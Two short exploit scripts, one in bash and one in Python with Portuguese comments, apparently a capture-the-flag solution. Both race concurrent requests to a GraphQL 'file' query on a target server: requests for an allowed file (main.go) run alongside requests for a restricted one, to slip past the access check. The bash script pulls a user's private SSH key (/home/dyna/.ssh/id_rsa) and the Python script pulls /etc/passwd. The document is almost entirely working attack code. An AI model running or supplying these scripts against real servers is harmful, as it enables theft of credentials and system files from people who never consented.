#### bash
```bash
#!/usr/bin/env bash

URL="http://$1:$2/graphql"
PAYLOAD_FILE='{"query":"{ file(path: \"/home/dyna/.ssh/id_rsa\") { content } }"}'
PAYLOAD_GO='{"query":"{ file(path: \"main.go\") { content } }"}'

for i in {1..20}; do
  curl -s -H 'Content-Type: application/json' \
    -d "$PAYLOAD_GO" "$URL" >/dev/null &
  curl -s -H 'Content-Type: application/json' \
    -d "$PAYLOAD_FILE" "$URL"
done

wait
```

#### python
```python
#!/usr/bin/env python3
import requests
import sys, time
import json
from multiprocessing import Process, Queue

URL = f'http://{sys.argv[1]}:{sys.argv[2]}'

# Tenta conexão inicial com a aplicação
r = requests.get(URL)
time.sleep(1)

# Fila para capturar conteúdo sensível retornado pelos workers
queue = Queue()

def worker(path, queue):
    query = {
        "query": f'{{ file(path: "{path}") {{ name, path, content }} }}'
    }
    headers = {
        "Content-Type": "application/json"
    }
    while True:
        r = requests.post(f"{URL}/graphql", data=json.dumps(query), headers=headers)
        # Se estiver tentando ler /etc/passwd e o conteúdo incluir 'root', envia o resultado para a fila
        if 'passwd' in path and 'root' in r.text:
            queue.put(r.text)

processes = []

# Cria 8 processos que solicitam main.go (arquivo permitido)
for _ in range(8):
    p = Process(target=worker, args=('main.go', queue))
    processes.append(p)
    p.start()

# Cria 8 processos que solicitam /etc/passwd (arquivo restrito)
for _ in range(8):
    p = Process(target=worker, args=('/etc/passwd', queue))
    processes.append(p)
    p.start()

# Aguarda a chegada de uma resposta válida via queue.get()
file = queue.get()
print(file)

# Finaliza todos os processos assim que obtiver conteúdo válido
for p in processes:
    p.kill()

```